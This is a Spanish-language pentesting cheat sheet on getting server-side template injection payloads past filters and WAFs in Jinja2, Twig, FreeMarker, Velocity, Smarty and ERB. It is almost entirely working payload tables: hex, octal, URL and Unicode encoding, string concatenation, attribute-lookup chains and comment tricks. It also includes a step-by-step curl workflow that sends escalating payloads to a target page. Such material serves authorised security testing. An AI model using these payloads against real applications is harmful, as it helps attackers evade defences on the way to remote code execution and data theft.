---
aliases:
  - SSTI Bypass
  - SSTI Filter Evasion
  - SSTI WAF Bypass
tags:
  - vuln/ssti
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Server-Side Template Injection (SSTI)]]"
---
# SSTI - Bypasses y Filter Evasion

---

## Encoding (Unicode / Hex / Base64)

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{{ ()\|attr('\x5f\x5fclass\x5f\x5f')\|attr('\x5f\x5fmro\x5f\x5f') }}` | Hex escapes en attr arg → bypass `__` filter | Sandbox bloquea `__` literal. |
| `{{ '\137\137class\137\137' }}` (octal escapes) | Same idea base 8 | Filter regex no captura octal. |
| `%7B%7B7*7%7D%7D` (URL-encoded `{{7*7}}`) | URL encoded payload | WAF basado en regex sobre raw chars. |
| `%257B%257B7*7%257D%257D` (doble URL encoded) | Doble decode parser | Frontend decodifica 2 veces. |
| `&#x7B;&#x7B;7*7&#x7D;&#x7D;` (HTML entities) | Si app decodea HTML antes del template | Server-side render flow. |
| `｛｛7*7｝｝` (U+FF5B fullwidth Unicode) | Lookalike chars | Parser normaliza Unicode → SSTI ejecuta. |
| `{{ 'aWQ='\|b64decode\|attr('decode')() }}` | Encadenar decode con eval | b64decode filter disponible. |
| `{{ ('__cl' + 'ass__') }}` | String concat runtime | Filter strict en literal `__class__`. |
| `{{ "%c%c%c%c%c%c%c%c%c"\|format(95,95,99,108,97,115,115,95,95) }}` | ASCII codes → `__class__` | Filter regex sobre `__`. |
| `{{ ['__cl','ass__']\|join }}` | Array join concat | Filter strict literal. |
^ssti-bypass-encoding

---

## String Concatenation

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{{ '__cl' + 'ass__' }}` | Python concat runtime → `__class__` | Filter literal `__class__`. |
| `{{ "{}{}{}".format('__','cl','ass__') }}` | format() concat | Filter `+` blocked. |
| `{{ f'__{x}__' }}` con `x="cl"` | f-string concat | Python 3.6+. |
| `${"java.lang."+"Runtime"}` | Java concat (Velocity / FreeMarker) | Filter strict en classname. |
| `${String.format("%s%s","java.","lang.Runtime")}` | Java format() | Velocity/Java engines. |
| `${"java.".concat("lang.Runtime")}` | Java method chain | Same. |
| `{{ 'sys' ~ 'tem' }}` (Twig `~` operator) | Twig concat operator | Twig string concat. |
| `${["sys","tem"]?join("")}` | FreeMarker join sin separador | FreeMarker. |
| `{ldelim}{ldelim}7*7{rdelim}{rdelim}` | Smarty escape delimiters | Smarty filter. |
| `<%= "sys" + "tem" %>` | ERB direct concat | Ruby. |
^ssti-bypass-concat

---

## Attribute Lookup Chains

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `obj['__class__']['__bases__']` (bracket notation) | Bypass `.` dot filter | Sandbox filtra solo `.`. |
| `obj\|attr('__class__')` (Jinja2 attr filter) | Filter chain bypass | Sandbox filtra dot pero permite filter. |
| `getattr(obj, '__class__')` | Function form | Algunos sandboxes solo filtran sintaxis. |
| `vars(obj)['attr']` | Built-in dict access | Si vars() accessible. |
| `{{globals()['os']}}` | Reflection global lookup | Globals accessible. |
| `{{dir(obj)}}` | Listar attrs disponibles del object | Pre-explotación discovery. |
| `obj.__class__.__base__.__subclasses__()` | Alternativa a `__bases__[0]` | Filter en `__bases__`. |
| `type(obj).__bases__` | type() return class | `__class__` filtered. |
| `obj.__init_subclass__.__self__` | Magic method bypass | Strict sandbox. |
^ssti-bypass-attr-chain

### Workflow Jinja2 con sandbox estricto

```bash
# 1. Confirmar basics bloqueados
curl -G "https://target/page" --data-urlencode "q={{self.__init__.__globals__}}"
# → Forbidden

# 2. Probar bracket notation
curl -G "https://target/page" --data-urlencode "q={{()['__class__']}}"

# 3. Si no, attr filter
curl -G "https://target/page" --data-urlencode "q={{()|attr('__class__')|attr('__bases__')}}"

# 4. Si attr filtrado por substring, encoding hex
curl -G "https://target/page" --data-urlencode "q={{()|attr('\x5f\x5fclass\x5f\x5f')}}"

# 5. Si filtra `attr` literal, format
curl -G "https://target/page" --data-urlencode "q={{()|attr('%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95))}}"
```

---

## Comment / Whitespace Tricks

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{{ '__cl' ~ {# x #} ~ 'ass__' }}` (Jinja2 inline comment) | Romper string match con comment | Filter naive sobre raw string. |
| `{{ '_'~{# comment #}'_class__' }}` | Twig variant — inline comment break | Twig sandbox. |
| `${"java.<#-- comment -->lang.Runtime"}` (FreeMarker) | Inline comment dentro de classname | FreeMarker filter. |
| `#* comment *# ${cmd}` (Velocity comment) | Velocity-style comment | Velocity engine. |
| `{{   7   *   7   }}` (espacios múltiples) | Whitespace tolerance | Filter regex strict en spacing. |
| `{{${'\\'}n7*7${'\\'}n}}` (newlines in expr) | Newline en expression | Regex sin multi-line flag. |
| `{{- 7*7 -}}` (whitespace control syntax) | Trim whitespace explícito | Engines con whitespace control. |
| `{% raw %}{{7*7}}{% endraw %}` (raw block) | Algunos filtros procesan raw como ejecutable | Edge case engine. |
| `${"java"+<#--x-->".lang.Runtime"}` (compositional FreeMarker) | Comment-injection en concat | Filter sobre full classname. |
^ssti-bypass-comment-whitespace

### Patrón de bypass general

```
1. Identificar qué bloquea el filtro:
   - Substring match de "__class__" / "system" / "exec"
   - Regex de patrones
   - Caracteres prohibidos (.bracket.quote)

2. Contramedida:
   - Substring → concat / format / encoding
   - Regex → comments / whitespace
   - Charset → bracket / attr filter

3. Combinar capas: hex + concat + attr filter
```

---
